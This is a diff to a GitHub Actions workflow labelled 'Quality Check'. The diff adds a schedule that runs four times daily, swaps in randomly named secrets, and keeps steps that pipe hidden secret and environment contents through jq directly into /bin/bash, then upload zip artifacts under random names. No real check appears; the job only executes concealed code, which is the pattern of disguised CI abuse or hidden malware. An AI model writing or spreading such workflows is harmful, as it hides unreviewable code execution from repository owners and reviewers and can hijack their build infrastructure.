@@ -2,6 +2,8 @@ name: Quality Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '10 4,10,16,22 * * *'
 jobs:
   launch:
     runs-on: ubuntu-latest
@@ -13,18 +15,15 @@ jobs:
           fetch-depth: 1
       - name: Do work
         env:
-          h49: ${{ secrets.h49 }}
+          vtwa39145: ${{ secrets.vtwa39145 }}
         run: |
-          printf '%s' "$h49" | jq -r .poj9411 | /bin/bash
-          echo $xiuz29 | jq -r .kk38 | /bin/bash
-          printf '%s' "$bvszl40952" | jq -r .smlqe227 | /bin/bash
-          echo $qc325 | jq -r .hz71 | /bin/bash
-          printf '%s' "$gc251" | jq -r .rqwc29 | /bin/bash
-          echo $gcjec40032 | jq -r .ep580 | /bin/bash
+          printf '%s' "$vtwa39145" | jq -r .jjfml66717 | /bin/bash
+          printf '%s' "$ksol941" | jq -r .bsco91 | /bin/bash
+          echo $x7047 | jq -r .urgb43 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
         with:
-          name: qjvkFftR
+          name: 0qaF6Py7
           path: "*.zip"
           retention-days: 1
